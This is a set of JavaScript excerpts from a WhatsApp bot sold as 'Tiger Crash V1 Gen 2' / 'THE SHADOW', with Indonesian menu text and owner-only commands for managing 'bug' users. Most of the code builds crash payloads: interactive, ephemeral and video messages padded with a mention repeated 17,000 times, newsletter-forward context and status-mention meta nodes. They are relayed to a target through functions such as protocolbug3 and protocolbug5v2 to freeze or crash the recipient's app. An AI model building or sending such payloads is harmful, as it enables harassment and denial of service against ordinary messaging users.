        ...
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Tiger Crash 🐍 🐍 Is Back\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Tiger Crash 🐍 🐍 Bot', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
    ...
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          ...
          body: {
            text: 'Tiger Crash 🐍 🐍 Blank!' + Vampire + Private,
          },
          footer: {
            text: '',
          },
        ...
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    ...
                    body: {
                        text: "Tiger Crash 🐍 🐍 Bug" + Lalapo + Vampire
                    },
                    contextInfo: {
        ...
        await rikz.relayMessage(
            ...
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Tiger Crash 🐍 🐍 Here Bro" },
                        content: undefined
                    }
                ]
            }
...
description: "( Script Tiger Crash V1 Gen 2 )"
}
}
},
contextInfo: {
...
{
tag: "meta",
attrs: { is_status_mention: "🌀 *Tigerr* - 𝗧𝗿𝗮𝘀𝗵 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹" },
content: undefined
}
]
}
...
async function protocolbug3(target, mention) {
        ...
        await rikz.relayMessage(
            ...
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ Tiger Crash V1 Gen 2" },
                        content: undefined
                    }
                ]
            }
  ...
  async function protocolbug5v2(isTarget, mention) {
    ...
    const videoMessage = {
        ...
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363400289227650@newsletter",
            serverMessageId: 1,
                ...
                listResponseMessage: {
                    ...
                    contextInfo: {
                        ...
                        forwardedNewsletterMessageInfo: {
                            ...
                            serverMessageId: 1,
                            newsletterName: "Tigerrr? Come Heree!!!🐍〽"
                        }
                    },
                    description: "Tigerrrr?? yess, sirrr!!!🐍〽"
                }
            }
        },
        contextInfo: {
...
if (rikz.public === true) return m.reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗢𝗗𝗘 𝗖𝗢𝗢𝗟🥶");
rikz.public = true
m.reply(mess.succes)
}
break
...
case 'self': {
if (!isCreator) return m.reply(mess.owner) 
if (rikz.public === false) return m.reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗢𝗗𝗘 𝗪𝗔𝗥𝗥🔥");
rikz.public = false
m.reply(mess.succes)
}
break
...
case "shdw": {
let itsmenu = 
`Ola👋, 𝗛𝗮𝗶, 𝗔𝗸𝘂 𝗮𝗱𝗮𝗹𝗮𝗵 𝗧𝗛𝗘 𝗦𝗛𝗔𝗗𝗢𝗪 𝗬𝗮𝗻𝗴 𝗗𝗶𝗯𝘂𝗮𝘁 𝗨𝗻𝘁𝘂𝗸 𝗠𝗲𝗹𝗮𝘆𝗮𝗻𝗶 𝗔𝗻𝗱𝗮, 𝗠𝗼𝗵𝗼𝗻 𝗚𝘂𝗻𝗮𝗸𝗮𝗻 𝗗𝗲𝗻𝗴𝗮𝗻 𝗕𝗶𝗷𝗮𝗸!

[ \`𝗕𝗢𝗧 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\` ]
変 𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : 𝗟𝗨𝗡𝗔 𝗢𝗙𝗖
変 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟰
変 𝗕𝗼𝘁𝗡𝗮𝗺𝗲 : 𝗧𝗛𝗘 𝗦𝗛𝗔𝗗𝗢𝗪 
変 𝗔𝗰𝘁𝗶𝗼𝗻 : 𝗩𝗜𝗣 𝗕𝗨𝗬 𝗢𝗡𝗟𝗬
...
#𝗡𝗶𝗰𝗲 𝗧𝗲𝗮𝗺 𝗕𝗼𝘆 𝗧𝗛𝗘 𝗦𝗛𝗔𝗗𝗢𝗪, 𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗕𝘂𝘆 𝗦𝗰𝗿𝗶𝗽𝘁

> ©𝗩𝗜𝗣 𝗕𝗨𝗬 𝗢𝗡𝗟𝗬`;
await rikz.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/9k2fui.jpg" },
caption: itsmenu
}, { quoted: m });
}
break; 
...
m.reply(`𝗞𝗲𝗹𝗮𝘇𝘇 𝗡𝗼𝗺𝗼𝗿 ${user} 𝗧𝗲𝗹𝗮𝗵 𝗠𝗲𝗻𝗷𝗮𝗱𝗶 𝗠𝘂𝗿𝗯𝘂𝗴`)}
break;
//======================
case "delmurbug": {
if (!isCreator) return m.reply(mess.owner);
